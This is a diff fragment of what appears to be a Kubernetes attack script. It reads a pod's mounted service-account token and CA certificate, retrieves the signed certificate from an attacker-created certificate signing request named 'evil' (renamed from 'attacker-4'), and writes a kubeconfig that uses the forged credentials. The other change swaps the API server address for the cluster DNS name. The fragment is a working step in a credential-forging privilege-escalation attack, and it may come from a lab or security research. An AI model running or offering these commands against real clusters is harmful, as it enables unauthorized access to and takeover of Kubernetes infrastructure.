@@ -47,7 +47,7 @@ certificate approve evil
 ./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
 --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
 --server='https://kubernetes.default.svc.cluster.local' \
-get csr attacker-4 -o jsonpath='{.status.certificate}' | base64 -d | tee server.crt
+get csr evil -o jsonpath='{.status.certificate}' | base64 -d | tee server.crt
 
 # create kubeconfig 
 cat <<EOF > ./config
@@ -59,7 +59,7 @@ clusters:
   - name: default
     cluster:
       certificate-authority: /run/secrets/kubernetes.io/serviceaccount/ca.crt 
-      server: https://10.43.0.1:443
+      server: https://kubernetes.default.svc.cluster.local
 contexts:
 - context:
     cluster: default
